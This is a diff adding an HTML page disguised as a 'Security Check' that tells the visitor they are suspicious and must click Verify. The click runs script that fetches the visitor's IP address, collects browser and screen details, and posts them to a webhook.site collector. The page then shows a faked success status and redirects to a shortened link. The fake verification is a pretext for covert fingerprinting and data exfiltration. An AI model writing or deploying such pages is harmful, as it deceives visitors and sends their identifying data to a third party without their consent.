@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Security Check</title>
+  <style>
+    body {
+      background-color: #121212;
+      color: white;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+    }
+    .card {
+      background-color: #1e1e1e;
+      border-radius: 10px;
+      padding: 30px;
+      display: inline-block;
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+    }
+    .button {
+      background-color: #28a745;
+      border: none;
+      color: white;
+      padding: 12px 24px;
+      text-align: center;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .status {
+      margin-top: 20px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>You are a suspicious user</h2>
+    <p>To continue to the redirect, click the green verify button below.</p>
+    <button class="button" onclick="verifyUser()">✅ Verify</button>
+    <div id="status" class="status"></div>
+  </div>
+
+  <script>
+    async function verifyUser() {
+      const statusEl = document.getElementById('status');
+      statusEl.textContent = 'Verifying…';
+
+      let ip = 'unknown';
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        ip = data.ip;
+      } catch (err) {
+        statusEl.textContent = 'Could not get IP';
+      }
+
+      const payload = {
+        ip,
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        screen: {
+          width: screen.width,
+          height: screen.height
+        }
+      };
+
+      try {
+        await fetch('https://webhook.site/e9c6bc31-492e-4e09-962c-f6b3c7226e3c', {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        });
+
+        // Since no-cors doesn't return status codes, we'll fake it:
+        statusEl.textContent = '✔️ Status: 200 (Sent). Redirecting…';
+        setTimeout(() => {
+          window.location.href = 'https://tiny.cc/BNdiary';
+        }, 2000);
+
+      } catch (error) {
+        statusEl.textContent = '❌ Status: Failed to send.';
+      }
+    }
+  </script>
+</body>
+</html>
